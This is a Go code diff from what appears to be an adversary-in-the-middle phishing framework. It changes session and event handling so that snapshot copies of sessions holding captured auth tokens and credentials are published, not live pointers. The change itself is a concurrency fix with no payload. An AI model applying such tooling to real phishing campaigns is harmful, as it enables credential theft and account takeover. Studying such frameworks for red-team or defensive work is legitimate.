@@ -53,6 +53,11 @@ type Session struct {
 	CompletedAt  *time.Time // nil until all auth_tokens are captured
 }
 
+// Snapshot returns a shallow copy of the session, safe to read from another
+// goroutine without holding a lock. Map fields are shared (not deep-copied)
+// but are only appended to during the session lifecycle, not mutated in place.
+func (s *Session) Snapshot() Session { return *s }
+
 // IsDone returns true when all required auth tokens have been captured.
 func (s *Session) IsDone() bool { return s.CompletedAt != nil }
 
@@ -217,7 +222,8 @@ func (s *SessionService) Complete(session *Session) error {
 	}
 
 	s.cache.Delete(session.ID)
-	s.Bus.Publish(Event{Type: sdk.EventSessionCompleted, Payload: session})
+	snap := session.Snapshot()
+	s.Bus.Publish(Event{Type: sdk.EventSessionCompleted, Payload: &snap})
 
 	return nil
 }
@@ -226,7 +232,8 @@ func (s *SessionService) Update(session *Session) error {
 	if err := s.Store.UpdateSession(session); err != nil {
 		return err
 	}
-	s.Bus.Publish(Event{Type: sdk.EventTokensCaptured, Payload: session})
+	snap := session.Snapshot()
+	s.Bus.Publish(Event{Type: sdk.EventTokensCaptured, Payload: &snap})
 	return nil
 }
 
@@ -234,7 +241,8 @@ func (s *SessionService) CaptureCredentials(session *Session) error {
 	if err := s.Store.UpdateSession(session); err != nil {
 		return err
 	}
-	s.Bus.Publish(Event{Type: sdk.EventCredsCaptured, Payload: session})
+	snap := session.Snapshot()
+	s.Bus.Publish(Event{Type: sdk.EventCredsCaptured, Payload: &snap})
 	return nil
 }
 
@@ -275,7 +283,8 @@ func (s *SessionService) NewSession(clientIP, ja4Hash, userAgent, lureID, phishl
 	}
 
 	s.cache.Store(sess.ID, sess)
-	s.Bus.Publish(Event{Type: sdk.EventSessionCreated, OccurredAt: time.Now(), Payload: sess})
+	snap := sess.Snapshot()
+	s.Bus.Publish(Event{Type: sdk.EventSessionCreated, OccurredAt: time.Now(), Payload: &snap})
 
 	return sess, nil
 }
